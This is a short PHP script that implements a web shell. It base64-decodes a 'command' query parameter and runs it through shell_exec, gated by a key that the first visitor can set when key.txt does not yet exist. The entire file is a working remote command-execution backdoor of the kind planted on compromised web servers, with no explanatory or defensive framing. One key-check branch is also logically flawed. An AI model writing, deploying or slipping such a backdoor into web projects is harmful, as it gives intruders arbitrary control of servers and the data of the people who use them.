<?php

function check_key($key){
    $key_decode = base64_decode($key);
    if(file_exists("key.txt")){
        $original_key = base64_decode(file_get_contents("key.txt"));

        if($key_decode == $original_key){
            return true;
        }else{
            return false;
        }
    }else{
        return null;
    }
}

function execute($command){
    $command_decode = base64_decode($command);
    //echo $command_decode;
    $output = json_encode(
        array(
        "status"=>"Failure"
    ));
    
    try {
        $output = json_encode(
            array(
                "status"=>"success",
                "output"=>shell_exec(
                    $command_decode
                )
            )
                );
    } catch (\Throwable $th) {
        
    }

    return $output;
}
if(isset($_GET["command"]) && isset($_GET["key"])){
    if(check_key($_GET["key"])){
        echo(execute($_GET["command"]));
    }elseif(check_key($_GET["key"] == null)){
        echo json_encode(
        array(
            "status"=>"failure",
            "output"=>"'key.txt' not exist"
        )
        );
    }else{
        echo json_encode(
        array(
            "status"=>"failure",
            "output"=>"incorrect key"
        )
        ); 
    }
}
if(isset($_GET["key"]) && !isset($_GET["command"]) && !file_exists("key.txt")){
    $key_encrypted = base64_encode($_GET["key"]);
    file_put_contents("key.txt",$key_encrypted);
}
?>